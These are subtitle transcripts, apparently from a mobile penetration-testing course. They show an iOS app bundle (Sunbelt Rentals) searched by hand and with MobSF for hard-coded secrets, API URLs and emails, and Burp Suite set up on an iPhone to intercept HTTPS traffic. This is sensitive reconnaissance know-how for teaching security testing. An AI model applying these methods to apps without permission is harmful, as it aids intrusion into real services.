00:03:46.150 --> 00:03:48.570
You can also take a look through here

99
00:03:48.570 --> 00:03:52.270
in the frameworks folder, for example.

100
00:03:52.470 --> 00:03:54.010
This is kind of where some of the

101
00:03:54.010 --> 00:03:56.450
application source code is going to be stored.

102
00:03:59.590 --> 00:04:01.210
You can take a look through the assets.

103
00:04:01.490 --> 00:04:03.790
This is where we're going to find things

104
00:04:03.790 --> 00:04:05.550
like the app.json here.

105
00:04:05.790 --> 00:04:07.850
You can also find some things like images.

106
00:04:08.290 --> 00:04:09.470
There's nothing really in here.

107
00:04:10.350 --> 00:04:11.430
Go to the source here.

108
00:04:11.490 --> 00:04:14.790
You can see assets, environments, different JSON files

109
00:04:14.790 --> 00:04:15.170
here.

110
00:04:15.170 --> 00:04:21.480
prod.json. And now we have a ton

111
00:04:21.480 --> 00:04:24.100
of different URLs in this application that we've

112
00:04:24.100 --> 00:04:24.760
just discovered.

113
00:04:25.360 --> 00:04:26.980
So, make sure you go out and look

114
00:04:26.980 --> 00:04:29.540
at the environment variables, everything like that.

115
00:04:29.640 --> 00:04:31.600
We have API URLs here.

116
00:04:32.000 --> 00:04:34.300
All types of different endpoints are now expanding

117
00:04:34.300 --> 00:04:36.340
our scope when we're looking through this application.

118
00:04:36.940 --> 00:04:40.220
Obviously, these ones with dev, QA, JSON, perf,

119
00:04:40.860 --> 00:04:41.360
etc.

120
00:04:41.860 --> 00:04:44.600
will be additional URLs as well.

121
00:04:45.440 --> 00:04:46.680
So, I'm going to go back here.

122
00:04:46.680 --> 00:04:48.020
Go back to the source here.

123
00:04:48.740 --> 00:04:50.700
Go to modules this time.

124
00:04:50.780 --> 00:04:52.480
You would just want to basically take a

125
00:04:52.480 --> 00:04:53.900
look through everything here.

126
00:04:54.060 --> 00:04:58.120
Have our accountmenu.json. So, this is another

127
00:04:58.120 --> 00:04:59.020
JSON file.

128
00:04:59.520 --> 00:05:01.760
Looks like it's defining some things about the

129
00:05:01.760 --> 00:05:02.480
account menu.

130
00:05:03.080 --> 00:05:05.480
Different types of things here.

131
00:05:05.800 --> 00:05:08.800
Yep, like getting help, support, pickup, the structure

132
00:05:08.800 --> 00:05:11.120
of the account menu of the application.

133
00:05:12.080 --> 00:05:14.040
You can obviously read through all the different

134
00:05:14.040 --> 00:05:16.280
JSONs and all the different folders and everything

135
00:05:16.280 --> 00:05:17.080
they have here.

136
00:05:17.180 --> 00:05:19.760
They have some stuff here for corporate responsibility.

137
00:05:22.700 --> 00:05:23.960
I'm going to go back up another level.

138
00:05:24.080 --> 00:05:25.960
Go all the way back to our sunbeltrentals

139
00:05:25.960 --> 00:05:28.360
.app. So, you want to basically take a

140
00:05:28.360 --> 00:05:29.900
look through the assets folder there.

141
00:05:30.000 --> 00:05:32.620
Try to find any JSON files, any hard

142
00:05:32.620 --> 00:05:35.000
-coded strings in there that might have like

143
00:05:35.000 --> 00:05:37.320
a username or password or anything like that.

144
00:05:37.800 --> 00:05:38.760
You want to take a look through the

145
00:05:38.760 --> 00:05:39.620
frameworks folder.

146
00:05:39.820 --> 00:05:41.200
You want to take a look through the

147
00:05:41.200 --> 00:05:45.100
info.plist, the google services info.plist, or

148
00:05:45.100 --> 00:05:47.760
any other generic plist files that they actually

149
00:05:47.760 --> 00:05:50.100
have listed here on the top level of

150
00:05:50.100 --> 00:05:50.800
the application.

151
00:05:51.400 --> 00:05:53.180
You can obviously also take a look through

152
00:05:53.180 --> 00:05:54.880
like the scinfo here.

153
00:05:55.120 --> 00:05:57.460
There's a manifest.plist file here.

154
00:05:58.720 --> 00:06:01.460
This can sometimes have some interesting things in

155
00:06:01.460 --> 00:06:02.860
it that they might be storing, but in

156
00:06:02.860 --> 00:06:04.320
this case there's nothing here.

157
00:06:06.860 --> 00:06:08.100
So, this is kind of how you would

158
00:06:08.100 --> 00:06:12.340
look through the application from a source code

159
00:06:12.340 --> 00:06:15.140
perspective, just looking through the file system of

160
00:06:15.140 --> 00:06:16.000
the application.

161
00:06:16.280 --> 00:06:20.520
Again, to quickly highlight the process again, what

162
00:06:20.520 --> 00:06:22.780
we did here is I had the IPA

163
00:06:22.780 --> 00:06:25.300
file taken from AnyTrans.

164
00:06:25.360 --> 00:06:27.380
Remember we pulled this application right off the

165
00:06:27.380 --> 00:06:29.540
app store and put it onto our MacBook.

166
00:06:30.060 --> 00:06:33.900
I duplicated this file to a sunbeltrentals.ipa

167
00:06:33.900 --> 00:06:38.300
duplicate, renamed that file to payload.zip, opened

168
00:06:38.300 --> 00:06:41.080
the payload.zip, went to the payload folder,

169
00:06:41.340 --> 00:06:42.900
and then you go to the payload folder

170
00:06:42.900 --> 00:06:44.100
inside of that folder.

171
00:06:44.100 --> 00:06:46.960
And then you control click or right click

172
00:06:46.960 --> 00:06:50.400
here, the sunbeltrentals.app, and show the package

173
00:06:50.400 --> 00:06:51.060
contents.

174
00:06:51.540 --> 00:06:52.920
And that's how you get to the point

175
00:06:52.920 --> 00:06:55.460
here of actually looking through the application source

176
00:06:55.460 --> 00:06:57.460
code, taking a look through some of the

177
00:06:57.460 --> 00:06:59.620
hard-coded files and everything like that.

178
00:07:00.160 --> 00:07:01.760
So, that is how you would do this

179
00:07:01.760 --> 00:07:04.100
from a manual perspective and looking through the

180
00:07:04.100 --> 00:07:05.200
file system manually.

181
00:07:05.640 --> 00:07:07.520
Let's move on now to how we can

182
00:07:07.520 --> 00:07:10.700
do our static analysis using MobSF to kind

183
00:07:10.700 --> 00:07:12.660
of speed up this process a little bit.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.510 --> 00:00:03.570
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, now let's analyse our .ipa file using

2
00:00:03.570 --> 00:00:04.330
MobSF.

3
00:00:04.730 --> 00:00:07.230
Now MobSF can be downloaded from GitHub.

4
00:00:07.430 --> 00:00:09.110
You can do a quick Google search for

5
00:00:09.110 --> 00:00:10.890
MobSF and you should be able to find

6
00:00:10.890 --> 00:00:13.310
this GitHub repo really easily.

7
00:00:13.630 --> 00:00:15.690
I'm going to click code here and copy

8
00:00:15.690 --> 00:00:18.030
the URL here.

9
00:00:18.530 --> 00:00:20.050
I'm going to hop over to my terminal

10
00:00:20.050 --> 00:00:23.410
now and I already have this installed, but

11
00:00:23.410 --> 00:00:25.010
if you wanted to instal this for the

12
00:00:25.010 --> 00:00:26.930
first time you would just do a git

13
00:00:26.930 --> 00:00:29.850
clone and then you would paste the URL

14
00:00:29.850 --> 00:00:33.450
in there and it would clone into your

15
00:00:33.450 --> 00:00:33.970
repository.

16
00:00:33.970 --> 00:00:36.050
As I said I already have this installed,

17
00:00:36.270 --> 00:00:38.350
but this is exactly how you would pull

18
00:00:38.350 --> 00:00:39.710
this tool right off of GitHub.

19
00:00:40.050 --> 00:00:41.730
So I'm going to cd over to my

20
00:00:41.730 --> 00:00:45.770
newly created folder now and do an ls

21
00:00:45.770 --> 00:00:49.090
here and for this to run on Mac

22
00:00:49.090 --> 00:00:50.970
all we're going to need to do is

23
00:00:50.970 --> 00:00:55.250
do a .slash setup.sh and we would

24
00:00:55.250 --> 00:00:59.830
run that and we would also do a

25
00:00:59.830 --> 00:01:05.830
.slash run.sh to run MobSF successfully.

26
00:01:06.770 --> 00:01:08.970
I already have everything set up as I

27
00:01:08.970 --> 00:01:09.810
previously said.

28
00:01:09.950 --> 00:01:11.990
This is pretty much very similar to what

29
00:01:11.990 --> 00:01:14.610
we saw earlier when I had you instal

30
00:01:14.610 --> 00:01:17.530
this tool for the Android side as well.

31
00:01:17.770 --> 00:01:20.090
So we can see now that MobSF is

32
00:01:20.090 --> 00:01:22.950
running on port 8000 on our localhost.

33
00:01:23.270 --> 00:01:28.640
I'm going to go to localhost port 8000.

34
00:01:30.020 --> 00:01:32.280
Just take a minute to load up here.

35
00:01:36.250 --> 00:01:38.530
Okay so here we are in MobSF now

36
00:01:38.530 --> 00:01:41.630
and just like with our Android applications we

37
00:01:41.630 --> 00:01:44.350
can use this application exactly the same way.

38
00:01:44.410 --> 00:01:46.110
We can just click upload and analyse.

39
00:01:46.530 --> 00:01:49.550
We can go find our .ipa file and

40
00:01:49.550 --> 00:01:51.570
just put it right in here.

41
00:01:51.690 --> 00:01:53.130
So I'm going to go to documents here.

42
00:01:53.130 --> 00:01:55.630
This is where my .ipa was stored from

43
00:01:55.630 --> 00:01:55.990
earlier.

44
00:01:56.170 --> 00:01:59.010
So we have our sunbeltrentals.ipa. I'm going

45
00:01:59.010 --> 00:02:00.070
to click open here.

46
00:02:00.710 --> 00:02:03.450
It's going to upload the file and analyse

47
00:02:03.450 --> 00:02:04.130
it locally.

48
00:02:04.310 --> 00:02:07.289
Pull out some nice strings, urls, everything like

49
00:02:07.289 --> 00:02:07.610
that.

50
00:02:07.789 --> 00:02:10.730
Make the application pretty easy to look at

51
00:02:10.730 --> 00:02:13.510
from a static analysis perspective.

52
00:02:17.530 --> 00:02:20.810
Okay so here we are with our MobSF

53
00:02:20.810 --> 00:02:22.370
report for this application.

54
00:02:22.810 --> 00:02:25.150
You can see we have some basic information

55
00:02:25.150 --> 00:02:26.670
about the application now.

56
00:02:27.070 --> 00:02:29.490
We have the MD5 hashes and everything of

57
00:02:29.490 --> 00:02:29.790
course.

58
00:02:29.910 --> 00:02:32.510
We have the SDK name, the versions of

59
00:02:32.510 --> 00:02:34.510
iOS that this is supporting here.

60
00:02:35.050 --> 00:02:37.210
Supporting platform being iPhone OS.

61
00:02:37.290 --> 00:02:38.910
You can see other ones here as well

62
00:02:38.910 --> 00:02:40.410
like Apple Watch etc.

63
00:02:41.450 --> 00:02:44.550
The application name, the type of application is

64
00:02:44.550 --> 00:02:45.690
developed in Swift.

65
00:02:46.430 --> 00:02:47.910
You can scroll down a bit more.

66
00:02:48.210 --> 00:02:50.570
Obviously you can find the url here for

67
00:02:50.570 --> 00:02:51.310
the app store.

68
00:02:51.770 --> 00:02:54.930
Some basic description and everything that was picked

69
00:02:54.930 --> 00:02:56.650
up from the app store of course because

70
00:02:56.650 --> 00:02:58.350
the application was signed with this.

71
00:02:59.310 --> 00:03:01.490
Here we'll see some basic things here.

72
00:03:01.570 --> 00:03:03.650
We can view the info.plist here.

73
00:03:03.970 --> 00:03:05.870
So we can look through that info.plist

74
00:03:05.870 --> 00:03:07.890
that we looked at with our manual analysis.

75
00:03:08.890 --> 00:03:12.010
Just manually here we obviously have this base64

76
00:03:12.010 --> 00:03:14.010
encoded firebase string.

77
00:03:15.270 --> 00:03:18.490
We can also click view strings here and

78
00:03:18.490 --> 00:03:20.490
MobSF will show us all the strings it

79
00:03:20.490 --> 00:03:23.390
was able to pull out of the application,

80
00:03:23.550 --> 00:03:24.770
human readable strings.

81
00:03:25.130 --> 00:03:26.910
So we will look at things like email

82
00:03:26.910 --> 00:03:29.230
addresses or just like straight up names.

83
00:03:29.810 --> 00:03:31.230
Obviously some of this is going to be

84
00:03:31.230 --> 00:03:34.970
gobbledygook here in the beginning, but if we

85
00:03:34.970 --> 00:03:37.470
keep on going down we should eventually find

86
00:03:37.470 --> 00:03:39.430
some normal strings here that will be part

87
00:03:39.430 --> 00:03:41.070
of the application source code.

88
00:03:43.210 --> 00:03:48.170
Seeing some stuff here, some different possibly class

89
00:03:48.170 --> 00:03:49.510
names, things like that.

90
00:03:51.030 --> 00:03:52.450
I'm not going to go through this whole

91
00:03:52.450 --> 00:03:53.670
strings file right now.

92
00:03:53.730 --> 00:03:54.910
It's going to take a little bit too

93
00:03:54.910 --> 00:03:57.070
long, but if we keep on scrolling through

94
00:03:57.070 --> 00:04:00.650
the MobSF report we can see some findings

95
00:04:00.650 --> 00:04:01.530
it might have here.

96
00:04:01.710 --> 00:04:04.510
So insecure communication to local host is allowed.

97
00:04:04.510 --> 00:04:07.110
I don't think that's necessarily a bad thing,

98
00:04:07.230 --> 00:04:09.710
it's just to itself here.

99
00:04:11.130 --> 00:04:14.830
See binary make use of insecure APIs, so

100
00:04:14.830 --> 00:04:22.950
possibly some issues here with these insecure coding

101
00:04:22.950 --> 00:04:23.530
methods.

102
00:04:26.240 --> 00:04:29.440
Keep on scrolling down here, has some different

103
00:04:29.440 --> 00:04:31.760
binary analysis findings here.

104
00:04:31.880 --> 00:04:33.600
It has a code signature if the binary

105
00:04:33.600 --> 00:04:34.280
is encrypted.

106
00:04:34.800 --> 00:04:36.400
The binary is always going to be encrypted

107
00:04:36.400 --> 00:04:38.540
if the application came off the app store

108
00:04:38.540 --> 00:04:40.240
directly, so that is a good thing.

109
00:04:40.600 --> 00:04:43.880
Has a stack canary, so might be preventing

110
00:04:43.880 --> 00:04:45.500
some buffer overflow attacks.

111
00:04:45.840 --> 00:04:47.960
You can see all the different types of

112
00:04:47.960 --> 00:04:49.220
plist files here.

113
00:04:49.480 --> 00:04:50.960
We looked through some of these in the

114
00:04:50.960 --> 00:04:54.000
manual section as well, like the manifest.plist,

115
00:04:54.060 --> 00:04:57.960
the info.plist here, google-service-info.plist.

116
00:04:58.300 --> 00:05:00.840
You can also see some accessibility resources bundle

117
00:05:00.840 --> 00:05:01.180
here.

118
00:05:01.800 --> 00:05:04.720
Something different in there, doesn't look like anything

119
00:05:04.720 --> 00:05:06.500
necessarily sensitive there.

120
00:05:09.700 --> 00:05:11.920
You'd want to look through all those plist

121
00:05:11.920 --> 00:05:14.020
files anyway just to make sure that you

122
00:05:14.020 --> 00:05:15.900
didn't miss anything when you were looking through

123
00:05:15.900 --> 00:05:19.420
this application from a static analysis perspective.

124
00:05:20.000 --> 00:05:22.840
Go down to the server locations here.

125
00:05:32.770 --> 00:05:35.010
My MacBook is freezing a little bit.

126
00:05:36.330 --> 00:05:38.450
Didn't find any domains here.

127
00:05:38.630 --> 00:05:41.430
Now it's extracting all the different URLs here.

128
00:05:41.430 --> 00:05:43.650
You can see things similar to this, like

129
00:05:43.650 --> 00:05:45.410
what we saw when we were looking through

130
00:05:45.410 --> 00:05:46.970
those JSON files.

131
00:05:47.430 --> 00:05:49.210
So you can see that MobSF now pulled

132
00:05:49.210 --> 00:05:52.050
out all of these URLs, which is obviously

133
00:05:52.050 --> 00:05:53.870
going to be very helpful for us as

134
00:05:53.870 --> 00:05:54.570
pen testers.

135
00:05:54.690 --> 00:05:56.710
We now have an idea of all the

136
00:05:56.710 --> 00:05:59.390
different types of API calls this application might

137
00:05:59.390 --> 00:05:59.950
be making.

138
00:06:00.170 --> 00:06:01.430
You can see some of this stuff is

139
00:06:01.430 --> 00:06:02.930
like QA, so you want to be looking

140
00:06:02.930 --> 00:06:06.510
for things like prod or without QA or

141
00:06:06.510 --> 00:06:07.270
test in here.

142
00:06:07.330 --> 00:06:09.370
So it looks like these ones might be

143
00:06:09.370 --> 00:06:10.470
the production ones.

144
00:06:10.750 --> 00:06:12.650
This could give you some idea of all

145
00:06:12.650 --> 00:06:15.110
the different network traffic being utilised by the

146
00:06:15.110 --> 00:06:15.730
application.

147
00:06:18.250 --> 00:06:20.070
Scrolling down a bit more, you can obviously

148
00:06:20.070 --> 00:06:22.730
see we have two pages here of URLs.

149
00:06:23.390 --> 00:06:26.010
These developer.mozilla ones might not be interesting,

150
00:06:26.330 --> 00:06:27.950
but you want to look through any of

151
00:06:27.950 --> 00:06:28.650
these other ones.

152
00:06:28.730 --> 00:06:31.050
See if they're using things like URL parameters

153
00:06:31.050 --> 00:06:31.590
here.

154
00:06:31.990 --> 00:06:34.310
Like for example here, there's this iframe mobile

155
00:06:34.310 --> 00:06:36.830
app for payments here.

156
00:06:37.550 --> 00:06:39.410
There's some URL parameters there that might be

157
00:06:39.410 --> 00:06:41.890
something you want to try to fuzz with,

158
00:06:41.990 --> 00:06:44.210
like cross-site scripting or anything like that.

159
00:06:44.890 --> 00:06:47.010
Looking down through here, you just want to

160
00:06:47.010 --> 00:06:50.210
check every one of these URLs and take

161
00:06:50.210 --> 00:06:52.370
a look for anything that is taking URL

162
00:06:52.370 --> 00:06:55.890
parameters, like here for example, catalogue ID kind

163
00:06:55.890 --> 00:06:56.310
of thing.

164
00:06:56.630 --> 00:06:58.590
Something to do with images there.

165
00:07:01.510 --> 00:07:03.910
Scrolling down a bit more, now the MobSF

166
00:07:03.910 --> 00:07:05.730
is going to try to extract out some

167
00:07:05.730 --> 00:07:06.130
emails.

168
00:07:06.350 --> 00:07:08.550
This can obviously be helpful if we're doing

169
00:07:08.550 --> 00:07:12.770
some research for possible email addresses or who

170
00:07:12.770 --> 00:07:13.870
developed the application.

171
00:07:14.050 --> 00:07:19.210
We have this customercare5000 at sunbeltrentals.com, customercare

172
00:07:19.210 --> 00:07:23.090
at sbr.com, and some gmail address here.

173
00:07:23.170 --> 00:07:24.450
Who knows where that came from?

174
00:07:26.860 --> 00:07:29.600
Again that gmail address appears here, so that's

175
00:07:29.600 --> 00:07:30.320
kind of interesting.

176
00:07:31.440 --> 00:07:33.460
I'm going to keep on scrolling down.

177
00:07:35.920 --> 00:07:38.320
Here it's showing us all the different types

178
00:07:38.320 --> 00:07:40.560
of files, so these might be interesting files

179
00:07:40.560 --> 00:07:42.100
that you want to go back and look

180
00:07:42.100 --> 00:07:45.340
through if you find anything interesting in here.

181
00:07:45.520 --> 00:07:50.000
But just generally speaking, that's everything that MobSF

182
00:07:50.000 --> 00:07:50.740
will show you.

183
00:07:51.320 --> 00:07:53.520
And you can see here, it even pulled

184
00:07:53.520 --> 00:07:56.080
out these assets for the dav.json and

185
00:07:56.080 --> 00:07:58.200
the perf.json that we saw earlier with

186
00:07:58.200 --> 00:07:59.180
a bunch of URLs.

187
00:07:59.520 --> 00:08:01.660
So it can help you to be pointed

188
00:08:01.660 --> 00:08:04.220
towards the right directions when you're looking through

189
00:08:04.220 --> 00:08:05.920
the application manually.

190
00:08:06.060 --> 00:08:07.480
You can go back and look through these

191
00:08:07.480 --> 00:08:10.200
different files if you think anything interesting might

192
00:08:10.200 --> 00:08:10.820
be in there.

193
00:08:11.200 --> 00:08:13.200
But you can see that MobSF is quite

194
00:08:13.200 --> 00:08:15.520
limited compared to when we used this in

195
00:08:15.520 --> 00:08:16.600
the Android version.

196
00:08:16.980 --> 00:08:18.840
It kind of just gives us a quick

197
00:08:18.840 --> 00:08:20.000
little overview, right?

198
00:08:20.080 --> 00:08:22.580
It doesn't really necessarily show us as much

199
00:08:22.580 --> 00:08:24.540
information as it did when we had the

200
00:08:24.540 --> 00:08:27.720
Android section, but it could just help us

201
00:08:27.720 --> 00:08:30.180
to save some time when we're actually just

202
00:08:30.180 --> 00:08:32.460
looking through, you know, for like the strings,

203
00:08:32.640 --> 00:08:35.700
the URLs, firebase databases, anything like that.

204
00:08:35.700 --> 00:08:37.419
It's going to be something that we want

205
00:08:37.419 --> 00:08:38.659
to use to be able to speed up

206
00:08:38.659 --> 00:08:39.240
the process.

207
00:08:39.820 --> 00:08:41.659
So usually what I'll do when I'm dealing

208
00:08:41.659 --> 00:08:44.200
with an IPA is I'll throw it through

209
00:08:44.200 --> 00:08:46.900
MobSF, see if it finds any interesting strings

210
00:08:46.900 --> 00:08:49.000
or anything like that, and then I'll go

211
00:08:49.000 --> 00:08:51.960
ahead and look through the application manually as

212
00:08:51.960 --> 00:08:55.380
well using that process we just used to

213
00:08:55.380 --> 00:08:57.400
go through the file system, go through any

214
00:08:57.400 --> 00:09:00.400
interesting files, and start taking notes on what

215
00:09:00.400 --> 00:09:02.980
URLs might be accessible, what URLs I think

216
00:09:02.980 --> 00:09:07.440
might possibly, you know, have some issues with

217
00:09:07.440 --> 00:09:09.380
them, or that when we're doing our dynamic

218
00:09:09.380 --> 00:09:12.220
analysis, when we're actually intercepting the traffic, I

219
00:09:12.220 --> 00:09:14.340
can get an understanding of what all those

220
00:09:14.340 --> 00:09:17.820
different URLs might be used for, or what

221
00:09:17.820 --> 00:09:20.400
to expect when we're actually intercepting the application

222
00:09:20.400 --> 00:09:20.860
traffic.

223
00:09:21.660 --> 00:09:23.840
So that's all I have for MobSF.

224
00:09:24.020 --> 00:09:27.300
Again, you can also export this report just

225
00:09:27.300 --> 00:09:29.080
like with Android if you wanted to provide

226
00:09:29.080 --> 00:09:32.100
a report to an executive or developer to

227
00:09:32.100 --> 00:09:33.900
show anything that MobSF had.

228
00:09:34.380 --> 00:09:37.880
Obviously when we're talking about the security score

229
00:09:37.880 --> 00:09:42.380
and everything here, I've noticed that iOS applications

230
00:09:42.380 --> 00:09:46.420
tend to have a higher score in MobSF

231
00:09:46.420 --> 00:09:48.140
than Android applications do.

232
00:09:48.460 --> 00:09:49.920
I don't know what the reason for that

233
00:09:49.920 --> 00:09:50.140
is.

234
00:09:50.200 --> 00:09:52.460
I think it's because MobSF is not necessarily

235
00:09:52.460 --> 00:09:54.820
able to find a lot of the same

236
00:09:54.820 --> 00:09:57.620
things that it does with an Android application,

237
00:09:57.780 --> 00:09:57.920
right?

238
00:09:58.000 --> 00:09:59.640
Like when we had the Android application, we

239
00:09:59.640 --> 00:10:01.480
could see all the app permissions and everything

240
00:10:01.480 --> 00:10:02.080
like that.

241
00:10:02.580 --> 00:10:05.920
I just have noticed that the iOS applications

242
00:10:05.920 --> 00:10:09.620
tend to have a higher security score with

243
00:10:09.620 --> 00:10:11.520
MobSF, so take that with a grain of

244
00:10:11.520 --> 00:10:13.660
salt, and you want to really take your

245
00:10:13.660 --> 00:10:15.600
time and look through these things manually.

246
00:10:15.820 --> 00:10:18.980
So from here, after having the MobSF report,

247
00:10:19.380 --> 00:10:21.320
I would have some idea of certain things

248
00:10:21.320 --> 00:10:21.960
to look for.

249
00:10:22.100 --> 00:10:24.300
Maybe those email addresses are interesting to me,

250
00:10:24.700 --> 00:10:27.120
maybe some of those .json files had some

251
00:10:27.120 --> 00:10:29.960
interesting content, or maybe I found some interesting

252
00:10:29.960 --> 00:10:33.380
strings, API keys, or anything like usernames or

253
00:10:33.380 --> 00:10:36.260
passwords or anything like that through the strings

254
00:10:36.260 --> 00:10:38.140
analysis from MobSF.

255
00:10:38.220 --> 00:10:40.300
It could be any number of things, but

256
00:10:40.300 --> 00:10:42.440
you can see now how MobSF can kind

257
00:10:42.440 --> 00:10:44.620
of make the process a little bit easier,

258
00:10:44.700 --> 00:10:46.500
and then we want to combine that with

259
00:10:46.500 --> 00:10:48.300
our manual process as well.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 12: iOS-Dynamic-Analysis-Jailbreaking

WEBVTT

1
00:00:00.700 --> 00:00:02.400
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, so now let's talk about how we

2
00:00:02.400 --> 00:00:06.020
can intercept our iPhone traffic using Burp Suite.

3
00:00:06.540 --> 00:00:09.440
So again, very similarly to Android, we're going

4
00:00:09.440 --> 00:00:10.920
to need to go to the proxy tab,

5
00:00:11.140 --> 00:00:13.660
and then go to options, and we're going

6
00:00:13.660 --> 00:00:16.440
to add a new proxy listener here, and

7
00:00:16.440 --> 00:00:18.160
in my case I'm going to bind this

8
00:00:18.160 --> 00:00:20.180
again to port 8082.

9
00:00:20.660 --> 00:00:23.040
We're going to select all interfaces here, click

10
00:00:23.040 --> 00:00:25.680
okay, and then say yes, so we're able

11
00:00:25.680 --> 00:00:28.940
to listen on all interfaces, and now we're

12
00:00:28.940 --> 00:00:32.100
going to actually go into our iPhone and

13
00:00:32.100 --> 00:00:34.620
set up the proxy in our iPhone.

14
00:00:34.920 --> 00:00:37.300
So here I am on my iPhone, I'm

15
00:00:37.300 --> 00:00:40.780
going to click settings here, go to my

16
00:00:40.780 --> 00:00:45.580
Wi-Fi network, click my Wi-Fi network

17
00:00:45.580 --> 00:00:51.680
here, scroll down, click configure proxy, change configure

18
00:00:51.680 --> 00:00:54.320
proxy to manual, and now we're going to

19
00:00:54.320 --> 00:00:56.400
have to fill this in with the details

20
00:00:56.400 --> 00:00:59.240
of our MacBook IP address.

21
00:00:59.860 --> 00:01:02.440
So here I'm going to be looking for

22
00:01:02.440 --> 00:01:05.840
just a terminal on my MacBook so I

23
00:01:05.840 --> 00:01:08.040
can run the command to find out what

24
00:01:08.040 --> 00:01:11.440
my IP address is, make this bigger for

25
00:01:11.440 --> 00:01:14.740
you, I'm going to do ifconfig, and this

26
00:01:14.740 --> 00:01:16.100
is how we're going to find out the

27
00:01:16.100 --> 00:01:18.760
IP address of our MacBook.

28
00:01:22.980 --> 00:01:25.440
So I'm going to press enter now, and

29
00:01:25.440 --> 00:01:27.140
I'm going to scroll up until I see

30
00:01:27.140 --> 00:01:30.520
my private IP address, and here my private

31
00:01:30.520 --> 00:01:36.640
IP address is 192.168.127.198, so

32
00:01:36.640 --> 00:01:38.680
I'm going to fill that detail in with

33
00:01:38.680 --> 00:01:46.400
my iPhone, 192.168.127.198, then my

34
00:01:46.400 --> 00:01:48.880
port is going to be 8082, that's what

35
00:01:48.880 --> 00:01:51.440
we set up with Burp Suite, remember in

36
00:01:51.440 --> 00:01:54.580
our options here port 8082, then I'm going

37
00:01:54.580 --> 00:01:56.920
to click save, and this is going to

38
00:01:56.920 --> 00:01:59.820
start proxying any of our traffic that is

39
00:01:59.820 --> 00:02:02.020
clear text through Burp Suite.

40
00:02:02.920 --> 00:02:05.780
So let me turn the intercept on, now

41
00:02:05.780 --> 00:02:07.720
we can open up like say Safari and

42
00:02:07.720 --> 00:02:13.460
go to like any HTTP website, we're going

43
00:02:13.460 --> 00:02:15.520
to get this error that the connection is

44
00:02:15.520 --> 00:02:20.580
not trusted because this is not trusting the

45
00:02:20.580 --> 00:02:22.620
Burp Suite certificate, so actually we need to

46
00:02:22.620 --> 00:02:25.180
go to Burp Suite now, we can go

47
00:02:25.180 --> 00:02:31.040
HTTP colon slash slash Burp and port 8082,

48
00:02:31.720 --> 00:02:34.300
and now we can see the CA certificates

49
00:02:34.300 --> 00:02:36.760
here, we just have to click CA certificate,

50
00:02:37.140 --> 00:02:39.480
click allow, and this is going to download

51
00:02:39.480 --> 00:02:42.560
the profile into the settings of the iPhone.

52
00:02:43.120 --> 00:02:44.780
So now we're going to go home, go

53
00:02:44.780 --> 00:02:48.060
to settings, go back here and go to

54
00:02:48.060 --> 00:02:53.260
the general section here in settings, scroll down

55
00:02:53.260 --> 00:02:55.060
all the way to the bottom, and now

56
00:02:55.060 --> 00:02:57.600
we see this profile area, we're going to

57
00:02:57.600 --> 00:03:01.000
click the profile, port swigger CA, and then

58
00:03:01.000 --> 00:03:02.880
we're going to install this, I'm going to

59
00:03:02.880 --> 00:03:06.440
put in my passcode here, and click install

60
00:03:06.440 --> 00:03:10.220
on the certificate, and now you can see

61
00:03:10.220 --> 00:03:12.600
that the port swigger CA is a trusted

62
00:03:12.600 --> 00:03:15.760
certificate, I'm going to click done, and now

63
00:03:15.760 --> 00:03:17.680
the last thing we actually need to do

64
00:03:17.680 --> 00:03:20.440
is go up to about here, and we

65
00:03:20.440 --> 00:03:22.660
need to go to the certificate trust settings,

66
00:03:22.780 --> 00:03:24.020
so I'm going to scroll down in the

67
00:03:24.020 --> 00:03:27.660
about section, click certificate trust settings, and now

68
00:03:27.660 --> 00:03:31.300
I need to toggle port swigger CA on,

69
00:03:31.620 --> 00:03:34.140
I'm going to click continue, and this enables

70
00:03:34.140 --> 00:03:37.520
full trust for root certificates, so now Safari

71
00:03:37.520 --> 00:03:40.660
should actually be working, we do a test

72
00:03:40.660 --> 00:03:43.140
here in Safari, we can see that now

73
00:03:43.140 --> 00:03:46.460
we're intercepting traffic with burp suite over here

74
00:03:46.460 --> 00:03:48.020
in our window, I'm just going to forward

75
00:03:48.020 --> 00:03:50.460
these along, you can see that we're intercepting

76
00:03:50.460 --> 00:03:52.040
HTTPS traffic.

77
00:03:53.940 --> 00:03:57.560
Okay, and at this point, depending on the

78
00:03:57.560 --> 00:04:00.840
mobile application that you're utilizing, you might actually

79
00:04:00.840 --> 00:04:03.200
be able to intercept some traffic, so let's

80
00:04:03.200 --> 00:04:06.420
actually try this here with rentals app, see

81
00:04:06.420 --> 00:04:08.060
if we can go past the main screen,

82
00:04:09.360 --> 00:04:11.660
this is detecting that my device is jailbroken,

83
00:04:11.940 --> 00:04:14.880
so that's not good, we'll be going through

84
00:04:14.880 --> 00:04:17.519
the jailbreak section later, but at this point,

85
00:04:17.620 --> 00:04:19.640
if you do have a normal iPhone, it's

86
00:04:19.640 --> 00:04:22.080
not jailbroken yet, you may be able to

87
00:04:22.080 --> 00:04:26.380
intercept some traffic for the device at this

88
00:04:26.380 --> 00:04:29.180
point, whatever application you're running, if they're not

89
00:04:29.180 --> 00:04:32.200
implementing SSL pinning, it should be okay, but

90
00:04:32.200 --> 00:04:34.500
if they are implementing SSL pinning, then you

91
00:04:34.500 --> 00:04:37.620
might find that your application still crashes, even

92
00:04:37.620 --> 00:04:39.740
after we do this, now we confirm that

93
00:04:39.740 --> 00:04:42.240
burp suite is definitely working by testing this

94
00:04:42.240 --> 00:04:46.020
through Safari here, we are able to intercept

95
00:04:46.020 --> 00:04:48.200
all the search traffic and everything like that,

96
00:04:48.340 --> 00:04:50.460
right, like down here on the very bottom

97
00:04:50.460 --> 00:04:54.500
of our proxy history, but so now burp

98
00:04:54.500 --> 00:04:56.360
suite is actually set up successfully.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:02.990
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's talk now about setting up ProxyMan

2
00:00:02.990 --> 00:00:03.710
for iOS.

3
00:00:04.230 --> 00:00:06.470
Now I mentioned this tool in the Android

4
00:00:06.470 --> 00:00:08.730
pen testing section of this course as well,

5
00:00:08.910 --> 00:00:10.530
but we're also going to set this up

6
00:00:10.530 --> 00:00:13.130
for our iOS phone.

7
